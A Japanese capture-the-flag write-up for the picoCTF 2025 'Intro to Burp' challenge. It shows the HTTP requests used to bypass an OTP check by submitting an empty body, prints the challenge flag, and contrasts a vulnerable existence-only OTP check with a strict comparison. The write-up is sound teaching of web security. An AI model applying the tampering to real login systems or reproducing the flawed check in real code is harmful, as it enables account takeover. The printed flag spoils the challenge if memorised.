# picoCTF 2025 – Intro to Burp (OTP Bypass)

## Category
Web Exploitation

---

## 📝 Problem Overview

Webアプリケーションでユーザー登録を行うと、その後 2段階認証（OTP: One Time Password）が要求される。

通常は正しいOTPを入力しない限り、ダッシュボードへアクセスできない。

しかし、HTTPリクエストを観察すると、OTP検証処理に不備がある可能性がある。

Burp Suite を使用してリクエストを改変し、OTPをバイパスしてフラグを取得する問題。

---

## 🔎 Recon（調査）

まず通常通り登録を行う。

### 🔹 1段階目：登録

```
POST / HTTP/1.1
Host: titan.picoctf.net:52939
Content-Type: application/x-www-form-urlencoded

csrf_token=...&full_name=x&username=x&phone_number=x&city=x&password=x&submit=Register
```

登録が成功すると、2段階認証画面に遷移する。

---

### 🔹 2段階目：OTP検証

```
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:52939
Content-Type: application/x-www-form-urlencoded

otp=vxccxvxc
```

ここでサーバーはOTPを検証している。

---

## 🧠 Hypothesis

OTP検証がサーバー側で正しく実装されていない可能性がある。

考えられる不備：

- 値の存在だけチェックしている
- 空文字チェックをしていない
- 正しい値と比較していない
- クライアント側のみで検証している

---

## 🛠 Exploitation

Burp Suite を使用して `/dashboard` へのPOSTリクエストを Repeater に送信。

改変内容：

```

```

（ボディを空にする）


---

## 📬 Server Response

```
Welcome, cf you sucessfully bypassed the OTP request.
Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_9090d63c}
```

OTPの検証が適切に行われていなかったため、バイパスに成功した。

---

## 🏁 Flag

```
picoCTF{#0TP_Bypvss_SuCc3$S_9090d63c}
```

---

## 🧩 Root Cause Analysis

本質的な問題は：

> サーバー側でOTP値の正当性を適切に検証していなかったこと。

脆弱な実装例（疑似コード）：

```python
if request.form.get("otp"):
    return dashboard()
```

本来は以下のように厳密比較が必要：

```python
if request.form.get("otp") == expected_otp:
    return dashboard()
```

---

## 🚨 なぜ危険か

- 認証ロジックが破綻する
- 任意ユーザーが不正ログイン可能
- 認証バイパスにつながる
- 実務では重大な認証不備（Authentication Bypass）

---

## 📚 What I Learned

- BurpでPOSTリクエストを捕まえることが重要
- 攻撃対象は「Body部分」
- Parameter Tampering はWeb攻撃の基本
- 認証ロジックの不備は重大な脆弱性
- クライアント側検証は意味がない

---

## 🔎 Attack Classification

- 脆弱性種別：Authentication Bypass
- 攻撃手法：Parameter Tampering
- 影響範囲：認証突破
- 重大度：High
